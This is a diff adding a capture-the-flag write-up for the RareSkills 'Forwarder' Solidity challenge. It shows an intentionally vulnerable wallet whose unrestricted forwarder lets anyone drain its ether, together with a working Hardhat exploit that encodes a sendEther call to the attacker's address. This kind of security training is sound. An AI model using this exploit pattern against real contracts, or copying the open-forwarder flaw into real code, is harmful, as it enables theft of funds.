@@ -1,3 +1,120 @@
+# Security - Week 3
+
+## RareSkills Riddles - Forwarder
+
+### Contracts
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.15;
+
+contract Wallet {
+    address public immutable forwarder;
+
+    constructor(address _forwarder) payable {
+        require(msg.value == 1 ether);
+        forwarder = _forwarder;
+    }
+
+    function sendEther(address destination, uint256 amount) public {
+        require(msg.sender == forwarder, "sender must be forwarder contract");
+        (bool success,) = destination.call{value: amount}("");
+        require(success, "failed");
+    }
+}
+
+contract Forwarder {
+    function functionCall(address a, bytes calldata data) public {
+        (bool success,) = a.call(data);
+        require(success, "forward failed");
+    }
+}
+```
+
+### Exploit
+
+To solve this challenge, we have to pass the correct abi-encoded data into the `functionCall` function of the `Forwarder` contract. More specifically, we want to specify `data` such that `functionCall` calls `sendEther` with `destination` set to our attacker wallet's address and `amount` set to 1 ether.
+
+One straightforward way to generate this data is to use the following `Encoder` helper contract:
+
+_Forwarder.sol_
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.15;
+
+contract Wallet {
+    ...
+}
+
+contract Forwarder {
+    ...
+}
+
+contract Encoder {
+    function encode(address destination, uint256 amount) external pure returns (bytes memory) {
+        return abi.encodeWithSignature("sendEther(address,uint256)", destination, amount);
+    }
+}
+```
+
+Using `encode`, we can then perform our attack as follows:
+
+_Forwarder.js_
+```javascript
+const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
+const { expect } = require("chai");
+const { ethers } = require("hardhat");
+
+const WALLET_NAME = "Wallet";
+const FORWARDER_NAME = "Forwarder";
+const NAME = "Forwarder tests";
+
+describe(NAME, function () {
+    async function setup() {
+        const [, attackerWallet] = await ethers.getSigners();
+        const value = ethers.utils.parseEther("1");
+
+        const forwarderFactory = await ethers.getContractFactory(FORWARDER_NAME);
+        const forwarderContract = await forwarderFactory.deploy();
+
+        const walletFactory = await ethers.getContractFactory(WALLET_NAME);
+        const walletContract = await walletFactory.deploy(forwarderContract.address, { value: value });
+
+        return { walletContract, forwarderContract, attackerWallet };
+    }
+
+    describe("exploit", async function () {
+        let walletContract, forwarderContract, attackerWallet, attackerWalletBalanceBefore;
+        before(async function () {
+            ({ walletContract, forwarderContract, attackerWallet } = await loadFixture(setup));
+            attackerWalletBalanceBefore = await ethers.provider.getBalance(attackerWallet.address);
+        });
+
+        it("conduct your attack here", async function () {
+            const encoderFactory = await ethers.getContractFactory("Encoder");
+            const encoderContract = await encoderFactory.deploy();
+
+            const data = await encoderContract.encode(attackerWallet.address, ethers.utils.parseEther("1"));
+
+            await forwarderContract.functionCall(walletContract.address, data);
+        });
+
+        after(async function () {
+            const attackerWalletBalanceAfter = await ethers.provider.getBalance(attackerWallet.address);
+            expect(attackerWalletBalanceAfter.sub(attackerWalletBalanceBefore)).to.be.closeTo(
+                ethers.utils.parseEther("1"),
+                1000000000000000
+            );
+
+            const walletContractBalance = await ethers.provider.getBalance(walletContract.address);
+            expect(walletContractBalance).to.be.equal("0");
+        });
+    });
+});
+```
+
+### Contract
+
 # Security - Week 2
 
 ## Capture the Ether (RareSkills Repo) - Token Sale
